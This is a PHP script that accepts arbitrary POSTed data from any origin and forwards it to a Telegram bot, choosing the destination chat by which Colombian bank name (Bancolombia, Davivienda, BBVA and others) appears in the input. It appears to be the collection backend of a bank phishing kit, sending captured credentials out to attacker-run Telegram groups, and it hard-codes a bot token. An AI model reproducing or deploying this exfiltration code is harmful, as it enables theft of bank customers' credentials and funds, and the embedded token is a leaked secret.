<?php
// Headers CORS
header('Access-Control-Allow-Origin: *'); // Permite todos los orígenes (cambia * por tu dominio específico si quieres más seguridad)
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');
header('Content-Type: application/json');

// Manejar preflight request (OPTIONS)
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Configuración del bot
$botToken = '8413578399:AAERJRC5zzMA5rSuRImTHKso-YwQX0vy7jI';

// Mapeo de palabras clave a chat IDs
$chatIdMap = [
    'BBVA' => '-4861191568',
    'CAJASOCIAL' => '-4678160019',
    'BANCOLOMBIA' => '-4977332475',
    'DAVIVIENDA' => '-4841072434',
    'DAVIPLATA' => '-4833485646',
    'POPULAR' => 'CHAT_ID_GENERAL',
    'BOGOTA' => '-4965407339',
    'AVVILLAS' => '-4837975443',
    // Agrega más según necesites
];

// Chat ID por defecto si no se encuentra ninguna palabra clave
$defaultChatId = 'CHAT_ID_DEFAULT';

// Obtener el cuerpo de la petición
$rawInput = file_get_contents('php://input');
$data = json_decode($rawInput, true);

// Validar que se recibieron datos
if (empty($rawInput)) {
    http_response_code(400);
    echo json_encode([
        'status' => 'error',
        'message' => 'No se recibió ningún dato'
    ]);
    exit;
}

// Preparar el mensaje
$message = '';
$chatId = $defaultChatId; // Inicializar con el chat ID por defecto

// Si es JSON válido, formatear el mensaje
if ($data !== null) {
    $message = isset($data['message']) ? $data['message'] : json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
} else {
    // Si no es JSON, enviar el texto plano
    $message = $rawInput;
}

// Buscar palabras clave en todo el contenido (rawInput completo)
$searchContent = strtolower($rawInput); // Convertir a minúsculas para búsqueda case-insensitive

foreach ($chatIdMap as $keyword => $keywordChatId) {
    if (strpos($searchContent, strtolower($keyword)) !== false) {
        $chatId = $keywordChatId;
        break; // Usar el primer match encontrado
    }
}

// URL de la API de Telegram
$telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

// Preparar los datos para Telegram
$postData = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML' // Opcional: soporta formato HTML
];

// Enviar a Telegram usando cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

// Procesar la respuesta
if ($curlError) {
    http_response_code(500);
    echo json_encode([
        'status' => 'error',
        'message' => 'Error de conexión'
    ]);
    exit;
}

$telegramResponse = json_decode($response, true);

if ($httpCode === 200 && $telegramResponse['ok']) {
    http_response_code(200);
    echo json_encode([
        'status' => 'ok'
    ]);
} else {
    http_response_code(500);
    echo json_encode([
        'status' => 'error',
        'message' => 'Error al enviar mensaje'
    ]);
}
